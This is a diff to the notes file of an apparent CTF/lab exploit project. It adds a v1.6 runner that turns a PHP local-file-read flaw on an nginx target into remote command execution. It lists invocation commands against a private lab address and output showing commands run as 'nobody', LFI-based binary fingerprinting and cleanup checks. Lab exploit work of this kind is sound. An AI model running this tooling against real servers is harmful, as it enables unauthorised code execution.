@@ -1,6 +1,6 @@
 # Demo PoC Improvement Notes
 
-Last updated: 2026-05-15 05:17:45 CEST
+Last updated: 2026-05-15 05:32:17 CEST
 
 ## Scope
 
@@ -11,6 +11,7 @@ The original working exploit path is preserved. The improved demo runners are se
 - `demo_ctf_exploit_v1_3.py`
 - `demo_ctf_exploit_v1_4.py`
 - `demo_ctf_exploit_v1_5.py`
+- `demo_ctf_exploit_v1_6.py`
 
 Both runners are still lab/CTF tooling. They keep the same remote-only rule for exploit inputs: target facts are learned over the HTTP-exposed PHP local-file-read primitive and HTTP behavior, not from SSH, Docker exec, a target-side debugger, or hardcoded ASLR bases.
 
@@ -187,18 +188,81 @@ run artifact: artifacts/demo_v1_5_20260515-051730.json
 
 Status: pass. The first round won, so the second round was not needed.
 
+## v1.6 Changes
+
+`demo_ctf_exploit_v1_6.py` adds the requested reliability and research features:
+
+- Hardened proof command construction with shell quoting.
+- `--exec-cmd` to run and capture arbitrary lab commands such as `id` or `whoami` into the marker file.
+- Optional delayed cleanup with `--cleanup-delay` and `--cleanup-core`.
+- Stale marker checks before exploitation.
+- Remote nginx/libc SHA-256 and ELF build-ID fingerprinting through LFI.
+- Negative-path testing with `--negative-test bad-candidate --negative-test-only --expected-fail`.
+- Best-effort multi-worker support via `--worker-mode correlate`; strict core PID matching remains the main guard.
+- Artifact summarization through `summarize_demo_artifacts.py`.
+
+Validated negative-path command:
+
+```bash
+./demo_ctf_exploit_v1_6.py \
+  --host 192.168.1.205 --port 19321 \
+  --fast --no-color --require-reset-core \
+  --negative-test bad-candidate --negative-test-only --expected-fail \
+  --no-binary-fingerprint --artifact-dir artifacts
+```
+
+Observed result:
+
+```text
+negative candidate produced no marker proof
+status: negative_pass
+run artifact: artifacts/demo_v1_6_20260515-053017.json
+```
+
+Validated command-exec/fingerprint command:
+
+```bash
+./demo_ctf_exploit_v1_6.py \
+  --host 192.168.1.205 --port 19321 \
+  --fast --no-color --require-reset-core --rounds 2 \
+  --exec-cmd id --cleanup-delay 30 --cleanup-core \
+  --artifact-dir artifacts
+```
+
+Observed result:
+
+```text
+nginx build-id: 060e053ab1fa1a2876b7fe0ff4eff0cc777857b6
+libc build-id: 095c7ba148aeca81668091f718047078d57efddb
+candidate sanity kept: 195
+candidate sanity dropped: 29
+winning address: 0x55a491955627
+winning body offset: 80
+command output: uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+run artifact: artifacts/demo_v1_6_20260515-053037.json
+```
+
+Cleanup check after the delay:
+
+```text
+marker LFI read: 404
+/app/tmp/core LFI read: 404
+```
+
+Status: pass.
+
 ## Recommended Demo Command
 
 For video recording:
 
 ```bash
-./demo_ctf_exploit_v1_5.py --host 192.168.1.205 --port 19321 --clear --require-reset-core --rounds 2
+./demo_ctf_exploit_v1_6.py --host 192.168.1.205 --port 19321 --clear --require-reset-core --rounds 2 --exec-cmd id
 ```
 
 For a fast validation run:
 
 ```bash
-./demo_ctf_exploit_v1_5.py --host 192.168.1.205 --port 19321 --fast --require-reset-core --rounds 2
+./demo_ctf_exploit_v1_6.py --host 192.168.1.205 --port 19321 --fast --require-reset-core --rounds 2 --exec-cmd id
 ```
 
 ## Remaining Technical Limits
